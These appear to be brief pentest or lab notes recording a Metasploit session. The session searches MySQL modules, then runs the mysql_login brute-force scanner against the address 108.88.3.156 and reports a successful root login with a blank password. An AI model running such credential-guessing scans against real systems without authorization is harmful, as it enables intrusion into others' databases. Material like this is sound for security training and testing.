## 扫描

```
Metasploit tip: Use sessions -1 to interact with the last opened session

msf6 > search name:mysql

Matching Modules
================

   #   Name                                               Disclosure Date  Rank                                       Check  Description
   -   ----                                               ---------------  ----                                       -----  -----------
   0   auxiliary/admin/mysql/mysql_enum                                    norma                                l     No     MySQL Enumeration Module
   1   auxiliary/admin/mysql/mysql_sql                                     norma                                l     No     MySQL SQL Generic Query
   2   auxiliary/scanner/mysql/mysql_authbypass_hashdump  2012-06-09       norma                                l     No     MySQL Authentication Bypass Password Dump
   3   auxiliary/scanner/mysql/mysql_file_enum                             norma                                l     No     MYSQL File/Directory Enumerator
   4   auxiliary/scanner/mysql/mysql_hashdump                              norma                                l     No     MYSQL Password Hashdump
   5   auxiliary/scanner/mysql/mysql_login                                 norma                                l     No     MySQL Login Utility
   6   auxiliary/scanner/mysql/mysql_schemadump                            norma                                l     No     MYSQL Schema Dump
   7   auxiliary/scanner/mysql/mysql_version                               norma                                l     No     MySQL Server Version Enumeration
   8   auxiliary/scanner/mysql/mysql_writable_dirs                         norma                                l     No     MYSQL Directory Write Test
   9   auxiliary/server/capture/mysql                                      norma                                l     No     Authentication Capture: MySQL
   10  exploit/linux/mysql/mysql_yassl_getname            2010-01-25       good                                       No     MySQL yaSSL CertDecoder::GetName Buffer Overflow
   11  exploit/linux/mysql/mysql_yassl_hello              2008-01-04       good                                       No     MySQL yaSSL SSL Hello Message Buffer Overflow
   12  exploit/multi/mysql/mysql_udf_payload              2009-01-16       excel                                lent  No     Oracle MySQL UDF Payload Execution
   13  exploit/windows/mysql/mysql_mof                    2012-12-01       excel                                lent  Yes    Oracle MySQL for Microsoft Windows MOF Execution
   14  exploit/windows/mysql/mysql_start_up               2012-12-01       excel                                lent  Yes    Oracle MySQL for Microsoft Windows FILE Privilege Abuse
   15  exploit/windows/mysql/mysql_yassl_hello            2008-01-04       avera                                ge    No     MySQL yaSSL SSL Hello Message Buffer Overflow
   16  exploit/windows/mysql/scrutinizer_upload_exec      2012-07-27       excel                                lent  Yes    Plixer Scrutinizer NetFlow and sFlow Analyzer 9 Default MySQL Crede                                ntial


Interact with a module by name or index. For example info 16, use 16 or use expl                                oit/windows/mysql/scrutinizer_upload_exec


```


```
msf6 > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > show options

Module options (auxiliary/scanner/mysql/mysql_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   true             no        Try blank passwords for all user                                s
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 t                                o 5
   DB_ALL_CREDS      false            no        Try each user/password couple st                                ored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current                                 database to the list
   DB_ALL_USERS      false            no        Add all users in the current dat                                abase to the list
   PASSWORD                           no        A specific password to authentic                                ate with
   PASS_FILE                          no        File containing passwords, one p                                er line
   Proxies                            no        A proxy chain of format type:hos                                t:port[,type:host:port][...]
   RHOSTS                             yes       The target host(s), range CIDR i                                dentifier, or hosts file with syntax 'file:<path>'
   RPORT             3306             yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential                                 works for a host
   THREADS           1                yes       The number of concurrent threads                                 (max one per host)
   USERNAME          root             no        A specific username to authentic                                ate as
   USERPASS_FILE                      no        File containing users and passwo                                rds separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password                                 for all users
   USER_FILE                          no        File containing usernames, one p                                er line
   VERBOSE           true             yes       Whether to print output for all                                 attempts


```


## 执行成功
```
msf6 auxiliary(scanner/mysql/mysql_login) >  set RHOSTS 108.88.3.156
RHOSTS => 108.88.3.156
msf6 auxiliary(scanner/mysql/mysql_login) > run

[+] 108.88.3.156:3306     - 108.88.3.156:3306 - Found remote MySQL version 5.0.51a
[+] 108.88.3.156:3306     - 108.88.3.156:3306 - Success: 'root:'
[*] 108.88.3.156:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mysql/mysql_login) >
```

